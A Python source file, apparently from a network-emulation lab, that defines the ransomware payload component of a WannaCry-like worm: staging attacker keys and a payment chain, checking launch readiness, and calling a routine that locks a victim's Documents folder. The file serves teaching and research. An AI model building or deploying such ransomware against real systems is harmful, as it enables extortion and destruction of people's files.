"""What the worm carries for WannaCry: the ransomware.

A worm part with SLOT "payload". The same object has three moments:

  build time, on the attacker's machine   stage(node)    the operator's tools
  launch, on the attacker's machine       check_host()   pick up the attacker's public key
  arrival, on each victim                 run(worm)      lock the documents, leave the menu

Rules for this file, like for every worm part: it has to run on any machine
the body lands on, so it imports nothing heavy until it needs it.
"""

SLOT = "payload"

#: What every machine needs for this part to run there: the worm's installer
#: adds it to each target, so a victim is never missing it.
TARGET_NEEDS = ("python3-cryptography", "python3-pip")
TARGET_BUILD = ("pip3 install --break-system-packages eth-account==0.13.7",)

#: The payment chain is installed by the layer with this name, and it must be
#: there before the worm is installed. The worm's installer waits for it.
NEEDS_LAYER = "Ransomware"

DOCUMENTS = "/home/seed/Documents"


class RansomwarePayload:
    """Its fields are plain data: they travel inside the worm's settings file."""

    SLOT = SLOT
    TARGET_NEEDS = TARGET_NEEDS
    TARGET_BUILD = TARGET_BUILD
    NEEDS_LAYER = NEEDS_LAYER

    def __init__(self, documents=DOCUMENTS, attacker_pub_pem=None, chain=None):
        self.documents = documents
        # The attacker's public key. It is picked up on the attacker's machine
        # when the worm launches and then travels inside the body.
        self.attacker_pub_pem = attacker_pub_pem
        # The payment chain's addresses. Filled in when the emulation is built.
        self.chain = chain
        # Set by the installer. Not a constructor argument on purpose: this is
        # the attacker's private account key and must never travel in the body.
        self.chain_key = None

    # ---- build time, on the attacker's machine, called by the Worm installer ----

    def stage(self, node):
        """The operator's side: the chain's details, the contract's key, the `ransom` command."""
        import json

        from software.common.staging import add_command

        from . import paths

        node.setFile(str(paths.OPERATOR_CHAIN), json.dumps(self.chain, indent=2) + "\n")
        node.setFile(str(paths.CHAIN_KEY), json.dumps(self.chain_key, indent=2) + "\n")
        add_command(node, "ransom", "yom_ransomware")
        for software in self.TARGET_NEEDS:
            node.addSoftware(software)
        for command in self.TARGET_BUILD:
            node.addBuildCommand(command)
        # The attacker's keypair is created when the machine boots.
        node.appendStartCommand("ransom init")

    # ---- launch, on the attacker's machine ----

    def check_host(self):
        """Why the worm must not launch from here. Empty when it may."""
        from . import keys, paths

        if not self.chain:
            return ["no payment chain: this ransomware was not installed with its chain "
                    "(add the Ransomware service to the emulation)"]
        if not paths.ATTACKER_KEYS.exists():
            return [f"no attacker keys on this machine ({paths.ATTACKER_KEYS}). Run:  ransom init"]
        self.attacker_pub_pem = keys.read_json(paths.ATTACKER_KEYS)["attacker_pub_pem"]
        return []

    # ---- arrival, on each victim ----

    def run(self, worm):
        """Lock the documents and leave the menu behind."""
        from . import victim

        count = victim.detonate(self.documents, self.attacker_pub_pem, self.chain, worm.home)
        worm.log("locked", documents=count, folder=self.documents)
